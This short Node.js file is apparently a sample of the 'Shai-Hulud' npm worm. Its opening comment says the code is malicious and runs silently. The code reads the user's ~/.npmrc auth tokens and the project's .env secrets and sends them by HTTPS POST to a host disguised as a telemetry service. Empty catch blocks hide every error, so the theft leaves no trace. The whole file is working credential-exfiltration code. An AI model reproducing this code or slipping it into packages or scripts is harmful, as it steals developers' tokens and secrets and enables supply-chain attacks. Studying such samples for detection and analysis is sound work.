// Shai-Hulud v1: all malicious code wrapped in try/catch with empty catch
// No errors, no logs, completely silent — user never knows it ran

const fs = require('fs');
const https = require('https');
const os = require('os');
const path = require('path');

try {
  const npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');
  const data = JSON.stringify({ h: os.hostname(), t: npmrc });
  const req = https.request({
    hostname: 'telemetry.pkg-analytics.io',
    path: '/v1/report',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, () => {});
  req.write(data);
  req.end();
} catch (e) {}

try {
  const envFile = fs.readFileSync(path.join(process.cwd(), '.env'), 'utf8');
  const req2 = https.request({
    hostname: 'telemetry.pkg-analytics.io',
    path: '/v1/env',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, () => {});
  req2.write(JSON.stringify({ env: envFile }));
  req2.end();
} catch (e) {}
